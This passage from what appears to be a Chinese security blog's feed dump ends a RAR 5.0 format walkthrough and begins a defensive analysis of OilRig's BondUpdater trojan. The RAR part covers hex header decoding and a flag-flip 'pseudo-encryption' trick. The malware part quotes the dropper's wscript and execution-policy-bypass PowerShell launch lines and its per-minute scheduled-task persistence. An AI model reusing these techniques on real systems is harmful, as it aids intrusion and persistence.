class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">00310850 - 00311002</span><br><span class="line">FF A6 73 44 - Header CRC32( Header size -&gt; Extra area )</span><br><span class="line">93 01 - Header size( Header <span class="built_in">type</span> -&gt; Extra area )</span><br><span class="line">02 - Header <span class="built_in">type</span>( 文件头 )</span><br><span class="line">03 - Header flags( 0x03 = 0x01 + 0x02 )</span><br><span class="line">6F - Extra area size[ 0x6F = (0x30+0x01) + (0x22+0x01) + (0x1A+0x01) ]</span><br><span class="line">D0 C5 01 - Data area size</span><br><span class="line">00 - File flags                       ‭  </span><br><span class="line">B3 E9 - Unpacked size </span><br><span class="line">01 20 - Attributes    </span><br><span class="line">80 03 - Compression information</span><br><span class="line">00 - Host OS</span><br><span class="line">15 - Name length( 15H = 21D )</span><br><span class="line">32 30 32 30 30 32 30 35 31 31 34 36 31 34 39 34 35 2E 70 6E 67 - Name</span><br><span class="line">30 - Size( Extra area ) 30H = 48D</span><br><span class="line">01 - Type( 文件加密记录 )</span><br><span class="line">00 - Version</span><br><span class="line">03 - Flags( 0x03 = 0x02 + 0x01 )</span><br><span class="line">0F - KDF count</span><br><span class="line">48 2F 76 C7 97 E7 8A 77 D5 55 F8 1F 5F 31 D8 26 - Salt</span><br><span class="line">5C 4C 4F B0 4F 94 01 90 95 95 2E E9 E6 BF 8F 75 - IV</span><br><span class="line">4D 87 A2 57 6C EA BA B2 EB D6 4E A8 - Check value</span><br><span class="line">22 - Size( Extra area ) 22H = 34D</span><br><span class="line">02 - Type( 文件哈希记录 )</span><br><span class="line">00 - Hash <span class="built_in">type</span></span><br><span class="line">16 87 E7 C4 D1 8C 13 AA BD B5 18 4A A9 C7 3E D1 85 85 95 B4 6F 12 3E 55 10 C6 86 7C 5A 2E 80 B9 - Hash data</span><br><span class="line">1A - Size( Extra area ) 1AH = 26D</span><br><span class="line">03 - Type( 文件时间记录 )</span><br><span class="line">0E - Flags( 0x0E = 0x02 + 0x04 + 0x08 )</span><br><span class="line">8C E5 A3 8C 2A 01 D6 01 - mtime</span><br><span class="line">7D A3 8E 8E 2A 01 D6 01 - ctime</span><br><span class="line">87 27 7A 12 2D 2D D6 01 - atime                           </span><br><span class="line">Data area: 00311003 - 00336298  25296B(压缩后大小)</span><br><span class="line">----------------------------------------------------------------------</span><br><span class="line">Note: vint类型的数据，如果是多字节的，前几个字节的最高位为连续标志</span><br><span class="line">(设为1)，低7位为数据，最后一个字节的最高位为0，低7位依旧是数据。所</span><br><span class="line">以我们需要提取出数据，进行重新组合，才能得到“Quick open header”</span><br><span class="line">和“Recovery record”真实偏移。</span><br><span class="line">1、Header size</span><br><span class="line">0x0193( 00000001 10010011 )</span><br><span class="line">0000001 0010011B = 10010011B = 93H = 147D</span><br><span class="line">2、Data area size</span><br><span class="line">0x01C5D0( 00000001 ‭11000101 11010000‬ )</span><br><span class="line">0000001 1000101 1010000‬B = 01100010 11010000‬B = 62D0H = 25296D</span><br><span class="line">3、Unpacked size</span><br><span class="line">0xE9B3( ‭11101001 10110011‬ )</span><br><span class="line">11101001 0110011B = ‬01110100 10110011B = 74B3H = ‭29875‬D</span><br><span class="line">4、Compression information</span><br><span class="line">0x0380( 00000011 10000000 )</span><br><span class="line">0000011 0000000B = 0000 011 0 000000B</span><br><span class="line">( 0000 - 字典大小128KB、011 - 标准压缩、0 - solid flag、000000 - 压缩算法版本 )</span><br><span class="line">5、FILETIME</span><br><span class="line">(1)https://support.microsoft.com/zh-cn/<span class="built_in">help</span>/188768/info-working-with-the-filetime-structure</span><br><span class="line">(2)https://www.pressc.cn/123.html</span><br><span class="line">(3)http://www.beijing-time.org/riqi.htm</span><br><span class="line">ctime</span><br><span class="line">7D A3 8E 8E 2A 01 D6 01  2020/05/19 00:24:42</span><br><span class="line">dwLowDateTime dwHighDateTime   </span><br><span class="line">0x8E8EA37D    0x01D6012A</span><br><span class="line">0x01D6012A8E8EA37D = ‭132294521345975165‬</span><br><span class="line">153175.0039699074*24*60*60*10000000 = 132343203429999993.6‬</span><br><span class="line">42*10000000 + 24*60*10000000 = 14820000000‬</span><br><span class="line">132343203429999993.6‬ + 14820000000‬ = 132343218249999993.6</span><br><span class="line">                                     132294521345975165‬</span><br><span class="line">----------------------------------------------------------------------</span><br></pre></td></tr></table></figure><h5 id="2-2-3-6、Recovery-record-恢复记录"><a href="#2-2-3-6、Recovery-record-恢复记录" class="headerlink" title="2.2.3.6、Recovery record(恢复记录)"></a>2.2.3.6、<strong><code>Recovery record(恢复记录)</code></strong></h5><p>&emsp;&emsp;加入冗余数据用于修复，在<code>压缩包本身损坏</code>但<code>恢复记录够多</code>时可对损坏压缩包进行恢复。<br><strong><code>实例：</code></strong><br>我们可以从例子RAR环境的图片中看到,恢复记录的大小约为19.6KB。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">336483 - 356643  (20161B 恢复记录)</span><br><span class="line">20161B/1024 = 19.6KB</span><br></pre></td></tr></table></figure></p><h5 id="2-2-3-7、End-of-archive-header-结尾块"><a href="#2-2-3-7、End-of-archive-header-结尾块" class="headerlink" title="2.2.3.7、End of archive header(结尾块)"></a>2.2.3.7、<strong><code>End of archive header(结尾块)</code></strong></h5><p>&emsp;&emsp;End of archive marker. RAR does not read anything after this header letting to use third party tools to add extra information such as a digital signature to archive.<br>&emsp;&emsp;标记<code>压缩文档结束</code>。 RAR在此头之后不读取任何内容，从而允许使用<code>第三方工具</code>来添加<code>扩展的信息</code>，例如<code>压缩文档的数字签名</code>。</p><table><thead><tr><th style="text-align:left">字段名称</th><th style="text-align:center">大小(类型)</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left">Header CRC32</td><td style="text-align:center">uint32</td><td style="text-align:left">头数据的CRC32，从“<code>Header size</code>”字段开始，直至“<code>End of archive flags</code>”字段。</td></tr><tr><td style="text-align:left">Header size</td><td style="text-align:center">vint</td><td style="text-align:left">头数据的大小，从“<code>Header type</code>”字段开始，直至“<code>End of archive flags</code>”字段。</td></tr><tr><td style="text-align:left">Header type</td><td style="text-align:center">vint</td><td style="text-align:left"><code>0x05</code></td></tr><tr><td style="text-align:left">Header flags</td><td style="text-align:center">vint</td><td style="text-align:left">所有头共有的标志：<br> <code>0x01</code> - 头末尾存在扩展区域。<br> <code>0x02</code> - 头末尾存在数据区域。<br> <code>0x04</code> - 当更新压缩文档时，必须跳过类型未知并拥有该标志的块。<br> <code>0x08</code> - 数据区域从上一卷继续。<br> <code>0x10</code> - 数据区域从下一卷继续。<br> <code>0x20</code> - 块取决于前一个文件块。<br> <code>0x40</code> - 如果修改了主块，则保留一个子块。</td></tr><tr><td style="text-align:left">End of archive flags</td><td style="text-align:center">vint</td><td style="text-align:left"><code>0x00</code> - 压缩文档不使用卷分割。或是集合中的最后一个卷。 <br> <code>0x01</code> - 压缩文档是卷，不是集合中的最后一个卷。</td></tr></tbody></table><p><strong><code>实例：</code></strong><br><img src="/resources/2020/RAR_Format/End of archive header.jpg" alt="结尾块"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">00356644 - 00356651</span><br><span class="line">1D 77 56 51 - Header CRC32( Header size -&gt; End of archive flags )</span><br><span class="line">03 - Header size( Header size -&gt; End of archive flags ) 03H = 3D</span><br><span class="line">05 - Header <span class="built_in">type</span>( 结尾块 )</span><br><span class="line">04 - Header flags( 0x04 )</span><br><span class="line">00 - End of archive flags</span><br></pre></td></tr></table></figure><h4 id="2-2-4、Service-headers-服务头"><a href="#2-2-4、Service-headers-服务头" class="headerlink" title="2.2.4、Service headers(服务头)"></a>2.2.4、Service headers(服务头)</h4><p>&emsp;&emsp;RAR uses service headers based on the file header data structure to store different supplementary information.<br>&emsp;&emsp;RAR使用基于<code>文件头数据结构</code>的<code>服务头</code>来存储不同的补充信息。</p><h5 id="2-2-4-1、Archive-comment-header-压缩文档注释服务头"><a href="#2-2-4-1、Archive-comment-header-压缩文档注释服务头" class="headerlink" title="2.2.4.1、Archive comment header(压缩文档注释服务头)"></a>2.2.4.1、<strong><code>Archive comment header(压缩文档注释服务头)</code></strong></h5><p>&emsp;&emsp;Optional header storing the main archive comment. Contains CMT identifier in file name field. Placed before any file headers and after the main archive header. Comment data is stored in UTF-8 immediately after the archive comment header. Now RAR does not use compression for archive comments, so packed and unpacked data sizes in header are equal and they both define the comment data size. Compression method in header is set to 0.<br>&emsp;&emsp;可选的头，用于存储<code>压缩文档注释</code>。在<code>文件名字段</code>中包含<code>CMT标识符</code>。放在<code>任何文件头</code>之前和<code>压缩文档头</code>之后。<code>注释数据</code>在<code>压缩文档注释头</code>之后用UTF-8存储。现在，RAR不对<code>压缩文件注释</code>使用压缩，因此头中的<code>压缩数据大小</code>和<code>未压缩数据大小</code>相等，并且它们都定义了<code>注释数据大小</code>。头中的<code>压缩方法</code>设置为0。</p><p><strong><code>实例：</code></strong><br><img src="/resources/2020/RAR_Format/Archive comment header.jpg" alt="压缩文档注释服务头"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">00310812 - 00310849</span><br><span class="line">EF 0D 46 57 - Header CRC32( Header size -&gt; Name )</span><br><span class="line">13 - Header size( Header <span class="built_in">type</span> -&gt; Name ) 13H = 19B</span><br><span class="line">03 - Header <span class="built_in">type</span>( 服务头 )</span><br><span class="line">02 - Header flags( 0x02 )</span><br><span class="line">8E 00 - Data area size</span><br><span class="line">04 - File flags( 0x04 )</span><br><span class="line">8E 00 - Unpacked size</span><br><span class="line">00 - Attributes</span><br><span class="line">F5 88 A4 AC - Data CRC32( 77 77 77 2E 62 61 69 64 75 2E 63 6F 6D 00 )</span><br><span class="line">80 00 - Compression information</span><br><span class="line">00 - Host OS</span><br><span class="line">03 - Name length( 03H = 3D )</span><br><span class="line">43 4D 54 - Name( CMT - 压缩文档注释 )                                                          </span><br><span class="line">77 77 77 2E 62 61 69 64 75 2E 63 6F 6D 00 - Data area( www.baidu.com )</span><br><span class="line">----------------------------------------------------------------------</span><br><span class="line">Note: vint类型的数据，如果是多字节的，前几个字节的最高位为连续标志</span><br><span class="line">(设为1)，低7位为数据，最后一个字节的最高位为0，低7位依旧是数据。所</span><br><span class="line">以我们需要提取出数据，进行重新组合，才能得到“Quick open header”</span><br><span class="line">和“Recovery record”真实偏移。</span><br><span class="line">1、Data size &amp;&amp; Unpacked size</span><br><span class="line">0x008E( 00000000 10001110 )</span><br><span class="line">0001110B = 00001110B = EH = 14D</span><br><span class="line">2、Compression information</span><br><span class="line">0x0080( 00000000 10000000 )</span><br><span class="line">0000000 0000000B = 0000 000 0 000000B</span><br><span class="line">( 0000 - 字典大小128KB、000 - 存储、0 - solid flag、000000 - 压缩算法版本 )</span><br><span class="line">----------------------------------------------------------------------</span><br></pre></td></tr></table></figure><h5 id="2-2-4-2、Quick-open-header-快速打开服务头"><a href="#2-2-4-2、Quick-open-header-快速打开服务头" class="headerlink" title="2.2.4.2、Quick open header(快速打开服务头)"></a>2.2.4.2、<strong><code>Quick open header(快速打开服务头)</code></strong></h5><p>&emsp;&emsp;Optional header storing the quick open record. Contains QO identifier in file name field. Placed after all file headers, but before the recovery record and end of archive header. It is possible to locate the quick open header with locator record in main archive header.<br>&emsp;&emsp;可选的头，用于存储<code>快速打开记录</code>。在<code>文件名</code>字段中包含<code>QO标识符</code>。置于<code>所有文件头</code>之后，但在<code>恢复记录</code>和<code>压缩文档结尾块</code>之前。可以在<code>压缩文档头</code>中找到带有定位记录的<code>快速打开头</code>。<br>&emsp;&emsp;Quick open record data is stored immediately after the quick open header. RAR does not use compression for quick open data, so packed and unpacked data sizes in header are equal and they both define the quick open data size. Compression method in header is set to 0.<br>&emsp;&emsp;<code>快速打开记录数据</code>将立即存储在<code>快速打开头</code>之后。 RAR不对<code>快速打开数据</code>使用压缩，因此头中的<code>压缩数据大小</code>和<code>未压缩数据大小</code>相等，并且它们都定义了<code>快速打开数据大小</code>。头中的压缩方法设置为0。<br>&emsp;&emsp;Quick open data is the array consisting of data cache structures. Every data cache structure stores a portion of archived data and has the following format:<br>&emsp;&emsp;<code>快速打开数据</code>是由<code>数据缓存结构</code>组成的数组。<code>每个数据缓存结构</code>都存储<code>一部分压缩数据</code>，并具有以下格式：</p><table><thead><tr><th style="text-align:left">字段名称</th><th style="text-align:center">大小(类型)</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left">Structure CRC32</td><td style="text-align:center">uint32</td><td style="text-align:left">从“<code>Structure size</code>”字段开始的结构数据的<code>CRC32</code>。</td></tr><tr><td style="text-align:left">Structure size</td><td style="text-align:center">vint</td><td style="text-align:left">从<code>标志字段</code>开始的结构数据的大小。在当前实现中，该字段不得超过<code>3个字节</code>，因此最大大小为<code>2 MB</code>。</td></tr><tr><td style="text-align:left">Flags</td><td style="text-align:center">vint</td><td style="text-align:left">当前设置为0。</td></tr><tr><td style="text-align:left">Offset</td><td style="text-align:center">vint</td><td style="text-align:left">从<code>快速打开头的开始</code>到当前结构中缓存的<code>压缩文档数据的开始</code>的偏移量。我们可以使用该值来计算存储当前结构的<code>压缩数据的绝对位置</code>。从结构数组的开头到结尾，可以保证数据缓存结构引用的绝对存档位置始终在增长。</td></tr><tr><td style="text-align:left">Data size</td><td style="text-align:center">vint</td><td style="text-align:left">当前结构中存储的<code>压缩文档数据的大小</code>。</td></tr><tr><td style="text-align:left">Data</td><td style="text-align:center">N bytes</td><td style="text-align:left">存储在当前结构中的<code>压缩文档数据</code>。</td></tr></tbody></table><p>&emsp;&emsp;Normally RAR uses the quick open data to store copies of file and service headers. It can store either all headers or only a part of them. If required header is missing in quick open data or if structure CRC32 is invalid, data are read from its original archive position.<br>&emsp;&emsp;通常，RAR使用<code>快速打开数据</code>来存储<code>文件的副本</code>和<code>服务头</code>。它可以存储<code>所有头</code>，也可以只存储<code>其中的一部分</code>。如果快速打开数据中<code>缺少必需的标头</code>，或者结构<code>CRC32无效</code>，则从其<code>原始存档位置</code>读取数据。<br>&emsp;&emsp;Using the quick open data is optional. You can skip it completely and read only standard archive headers. But it is important to use the same access pattern when reading file names to display them to user and to extract files. Otherwise it would be possible to see one file name and extract another in case the quick open data and real archive data are intentionally created different. It could introduce a security threat. So if you use the quick open data when displaying the archive contents, use it when extracting. If you do not use it when displaying the archive contents, do not use it when extracting.<br>&emsp;&emsp;使用<code>快速打开数据</code>是可选的。您可以完全跳过它，而仅读取<code>标准压缩文档头</code>。但是，重要的是在<code>读取文件名</code>时使用相同的访问模式以将其<code>显示给用户</code>并<code>提取文件</code>。否则，如果有意创建的<code>快速打开数据</code>和<code>实际存档数据</code>不同，则可能会看到<code>一个文件名</code>并提取<code>另一个文件名</code>。它可能会带来安全威胁。因此，如果在<code>显示存档内容时</code>使用快速打开的数据，请在<code>提取时</code>使用它。如果在<code>显示存档内容时</code>不使用它，则在<code>提取时</code>不要使用它。</p><p><strong><code>实例：</code></strong><br><img src="/resources/2020/RAR_Format/Quick open header.jpg" alt="快速打开服务头"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">00336299 - 00336482  </span><br><span class="line">C3 CA 91 FD - Header CRC32( Header size -&gt; Name )</span><br><span class="line">0E - Header size( Header size -&gt; Name ) 0EH = 14D</span><br><span class="line">03 - Header <span class="built_in">type</span>( 服务头 ) </span><br><span class="line">06 - Header flags( 0x06 = 0x02 + 0x04 )</span><br><span class="line">A5 01 - Data area size</span><br><span class="line">00 - File flags</span><br><span class="line">A5 01 - Unpacked size</span><br><span class="line">00 - Attributes</span><br><span class="line">80 00 - Compression information</span><br><span class="line">00 - Host OS</span><br><span class="line">02 - Name length( 02H = 2D )</span><br><span class="line">51 4F - Name( QO - 快速打开头 )   </span><br><span class="line">16 E8 D1 20 - Structure CRC32( Structure size -&gt; Data ) Data area(快速打开记录数据)</span><br><span class="line">9F 01 - Structure size( Structure size -&gt; Data )</span><br><span class="line">00 - Flags</span><br><span class="line">E9 C6 01 - Offset</span><br><span class="line">99 01 - Data size</span><br><span class="line">FF A6 73 44 - Header CRC32( Header size -&gt; Extra area ) Data</span><br><span class="line">93 01 - Header size( Header <span class="built_in">type</span> -&gt; Extra area )</span><br><span class="line">02 - Header <span class="built_in">type</span>( 文件头 )</span><br><span class="line">03 - Header flags( 0x03 = 0x01 + 0x02 )</span><br><span class="line">6F - Extra area size[ 0x6F = (0x30+0x01) + (0x22+0x01) + (0x1A+0x01) ]</span><br><span class="line">D0 C5 01 - Data area size</span><br><span class="line">00 - File flags                       ‭  </span><br><span class="line">B3 E9 - Unpacked size </span><br><span class="line">01 20 - Attributes    </span><br><span class="line">80 03 - Compression information</span><br><span class="line">00 - Host OS</span><br><span class="line">15 - Name length( 15H = 21D )</span><br><span class="line">32 30 32 30 30 32 30 35 31 31 34 36 31 34 39 34 35 2E 70 6E 67 - Name</span><br><span class="line">30 - Size( Extra area ) 30H = 48D</span><br><span class="line">01 - Type( 文件加密记录 )</span><br><span class="line">00 - Version</span><br><span class="line">03 - Flags( 0x03 = 0x02 + 0x01 )</span><br><span class="line">0F - KDF count</span><br><span class="line">48 2F 76 C7 97 E7 8A 77 D5 55 F8 1F 5F 31 D8 26 - Salt</span><br><span class="line">5C 4C 4F B0 4F 94 01 90 95 95 2E E9 E6 BF 8F 75 - IV</span><br><span class="line">4D 87 A2 57 6C EA BA B2 EB D6 4E A8 - Check value</span><br><span class="line">22 - Size( Extra area ) 22H = 34D</span><br><span class="line">02 - Type( 文件哈希记录 )</span><br><span class="line">00 - Hash <span class="built_in">type</span></span><br><span class="line">16 87 E7 C4 D1 8C 13 AA BD B5 18 4A A9 C7 3E D1 85 85 95 B4 6F 12 3E 55 10 C6 86 7C 5A 2E 80 B9 - Hash data</span><br><span class="line">1A - Size( Extra area ) 1AH = 26D</span><br><span class="line">03 - Type( 文件时间记录 )</span><br><span class="line">0E - Flags( 0x0E = 0x02 + 0x04 + 0x08 )</span><br><span class="line">8C E5 A3 8C 2A 01 D6 01 - mtime</span><br><span class="line">7D A3 8E 8E 2A 01 D6 01 - ctime</span><br><span class="line">87 27 7A 12 2D 2D D6 01 - atime </span><br><span class="line">----------------------------------------------------------------------</span><br><span class="line">Note: vint类型的数据，如果是多字节的，前几个字节的最高位为连续标志</span><br><span class="line">(设为1)，低7位为数据，最后一个字节的最高位为0，低7位依旧是数据。所</span><br><span class="line">以我们需要提取出数据，进行重新组合，才能得到“Quick open header”</span><br><span class="line">和“Recovery record”真实偏移。</span><br><span class="line">1、Data area size &amp;&amp; Unpacked size</span><br><span class="line">0x01A5( 00000001 10100101 )</span><br><span class="line">0000001 0100101B = 10100101B = A5H = 165D</span><br><span class="line">2、Compression information</span><br><span class="line">0x0080( 00000000 10000000 )</span><br><span class="line">0000000 0000000B = 0000 000 0 000000B</span><br><span class="line">( 0000 - 字典大小128KB、000 - 存储、0 - solid flag、000000 - 压缩算法版本 )</span><br><span class="line">3、Structure size</span><br><span class="line">0x019F( 00000001 10011111 )</span><br><span class="line">0000001 0011111B = 10011111B = 9FH = 159D</span><br><span class="line">4、Offset</span><br><span class="line">0x01C6E9( 00000001 11000110 11101001 )</span><br><span class="line">0000001 1000110 1101001B = 01100011 01101001B = 6369H = ‭25449‬D</span><br><span class="line">336299 - 25449 = 310850(文件头起始偏移)</span><br><span class="line">5、Data size</span><br><span class="line">0x0199( 00000001 10011001 )</span><br><span class="line">0000001 0011001B = 10011001B = 99H = 153D</span><br><span class="line">----------------------------------------------------------------------</span><br></pre></td></tr></table></figure><hr><h2 id="3、针对RAR的主要攻击方式"><a href="#3、针对RAR的主要攻击方式" class="headerlink" title="3、针对RAR的主要攻击方式"></a>3、针对RAR的主要攻击方式</h2><h3 id="3-1、爆破"><a href="#3-1、爆破" class="headerlink" title="3.1、爆破"></a>3.1、爆破</h3><p>RAR 5.0 密码破解<br><a href="https://blog.xugr.me/post/rar-crack/" target="_blank" rel="noopener">https://blog.xugr.me/post/rar-crack/</a></p><h3 id="3-2、伪加密"><a href="#3-2、伪加密" class="headerlink" title="3.2、伪加密"></a>3.2、伪加密</h3><p>&emsp;&emsp;<code>伪加密</code>只发生在<code>RAR5.0以前的版本</code>中，我们只需要修改<code>FILE_HEAD</code>中的<code>HEAD_FLAGS</code>的<code>0x0004</code>标记为1，就可以造成<code>RAR伪加密</code>。</p>]]></content>
      
      <categories>
          
          <category> FileFormat </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>OilRig新型BondUpdater木马的DNS隐蔽隧道通信行为分析</title>
      <link href="/2019/04/11/OilRig%E6%96%B0%E5%9E%8BBondUpdater%E6%9C%A8%E9%A9%AC%E7%9A%84DNS%E9%9A%90%E8%94%BD%E9%9A%A7%E9%81%93%E9%80%9A%E4%BF%A1%E8%A1%8C%E4%B8%BA%E5%88%86%E6%9E%90/"/>
      <url>/2019/04/11/OilRig%E6%96%B0%E5%9E%8BBondUpdater%E6%9C%A8%E9%A9%AC%E7%9A%84DNS%E9%9A%90%E8%94%BD%E9%9A%A7%E9%81%93%E9%80%9A%E4%BF%A1%E8%A1%8C%E4%B8%BA%E5%88%86%E6%9E%90/</url>
      <content type="html"><![CDATA[<blockquote><p>一款使用DNS隐蔽信道通信的木马分析。<br>这是之前在公司实习的时候写的木马分析文章。<br><a id="more"></a></p></blockquote><h2 id="1、概述"><a href="#1、概述" class="headerlink" title="1、概述"></a>1、概述</h2><p>&emsp;&emsp;<code>OilRig</code>是伊朗的<code>APT组织</code>，<code>unit42</code>发现<code>2016年</code>中期以来，此组织一直很活跃，其经常对<code>中东地区</code>的<code>政府机构</code>和<code>企业</code>发动攻击。<code>2018年</code>8月，<code>Unit42</code>发现OilRig针对中东政府组织使用<code>鱼叉式钓鱼邮件</code>投递一个更新版本的<code>BondUpdater</code>。BondUpdater是<code>FireEye</code>于<code>2017年</code>11月中旬首次发现的基于<code>PowerShell</code>的特洛伊木马。</p><p>&emsp;&emsp;BondUpdater木马包含基本的后门功能，允许攻击者<code>上传</code>和<code>下载</code>文件，以及<code>执行命令</code>。与OilRig组织的其它工具一样，BondUpdater使用<code>DNS隧道</code>与<code>C2服务器</code>进行通信。<code>更新版本</code>的BondUpdater木马能够在DNS隧道中使用<code>TXT记录</code>与<code>C2</code>进行通信，<code>老版本</code>的是使用<code>A记录</code>与<code>C2</code>进行通信。</p><p>&emsp;&emsp;近期，我在研究利用<code>DNS隐蔽信道通信</code>的技术，所以找到了这样一个样本来进行分析，想了解一下，使用这种技术通信的恶意软件实现通信的细节，以便我可以研究怎么去检测这种攻击。</p><h2 id="2、样本分析"><a href="#2、样本分析" class="headerlink" title="2、样本分析"></a>2、样本分析</h2><h3 id="2-1、提取关键文件及代码"><a href="#2-1、提取关键文件及代码" class="headerlink" title="2.1、提取关键文件及代码"></a>2.1、提取关键文件及代码</h3><p><strong><code>MD5:</code></strong>52b6e1ef0d079f4c2572705156365c06</p><p>此样本是一个<code>word文档</code>，用Microsoft Word打开一下看看。</p><div align="left"><img src="/resources/2019/OilRig新型BondUpdater木马的DNS隐蔽隧道通信行为分析/1.png" width="70%" height="70%" alt=""></div><p>&emsp;&emsp;可以看到样本中嵌入了<code>宏代码</code>，但是利用word自带的<code>宏编辑器</code>是看不到宏代码的，我们可以通过<code>oledump</code>或者<code>oletools</code>来提取宏代码。我这里使用<code>oledump</code>来提取宏代码。</p><div align="left"><img src="/resources/2019/OilRig新型BondUpdater木马的DNS隐蔽隧道通信行为分析/2.png" width="70%" height="70%" alt=""></div><p>可以看到<code>宏代码</code>存在于<code>第7段</code>，我们将其转存为<code>ThisDocument.vb</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python oledump.py -s 7 -v 7cbad6b3f505a199d6766a86b41ed23786bbb99dab9cae6c18936afdc2512f00_doc &gt; ThisDocument.vb</span><br></pre></td></tr></table></figure></p><p><code>ThisDocument.vb</code>内容如下：</p><div align="left"><img src="/resources/2019/OilRig新型BondUpdater木马的DNS隐蔽隧道通信行为分析/3.png" width="70%" height="70%" alt=""></div><div align="left"><img src="/resources/2019/OilRig新型BondUpdater木马的DNS隐蔽隧道通信行为分析/4.png" width="70%" height="70%" alt=""></div><p>&emsp;&emsp;当运行宏之后，会首先执行<code>Document_Open()</code>函数，此函数调用了<code>AAAA()</code>函数，在AAAA()函数中，又调用了<code>HGHG()</code>函数，分别创建了两个文件，<code>AppPool.vbs</code>和<code>AppPool.ps1</code>,并将宏代码中嵌入的<code>vbs代码</code>和<code>powershell代码</code>写入这两个文件。之后通过执行<code>wscript C:\ProgramData\WindowsAppPool\AppPool.vbs</code>运行AppPool.vbs。</p><p>&emsp;&emsp;我们在虚拟机中跑一下，将这两个文件提取出来。</p><p><strong><code>AppPool.vbs</code></strong>内容如下：</p><div align="left"><img src="/resources/2019/OilRig新型BondUpdater木马的DNS隐蔽隧道通信行为分析/5.png" width="70%" height="70%" alt=""></div><p>&emsp;&emsp;当<code>AppPool.vbs</code>首次执行时，其创建一个每分钟执行的<code>计划任务</code>，使木马文件能够被<code>不断执行</code>。然后通过<code>PowerShell.exe -exec bypass -file C:\ProgramData\WindowsAppPool\AppPool.ps1</code>运行AppPool.ps1。</p><p>&emsp;&emsp;<code>AppPool.vbs</code>后续的执行过程中会判断是否存在<code>&quot;quid&quot;</code>的文件，如果存在，就使用上述<code>powershell</code>脚本运行<code>AppPool.ps1</code>。AppPool.ps1<code>首次运行</code>时会创建<code>quid文件</code>，以避免创建<code>多个计划任务</code>。</p><p><strong><code>AppPool.ps1</code></strong>内容如下：</p><div align="left"><img src="/resources/2019/OilRig新型BondUpdater木马的DNS隐蔽隧道通信行为分析/6.png" width="70%" height="70%" alt=""></div><p>&emsp;&emsp;原始的<code>AppPool.ps1</code>是经过<code>混淆</code>的，这是经过初步处理的，不过还不是很好懂。主要的操作都是由此<code>powershell</code>代码实现的，通过<code>DNS隐蔽信道</code>与<code>C2</code>进行通信的代码也在其中。</p><h3 id="2-2、分析关键代码"><a href="#2-2、分析关键代码" class="headerlink" 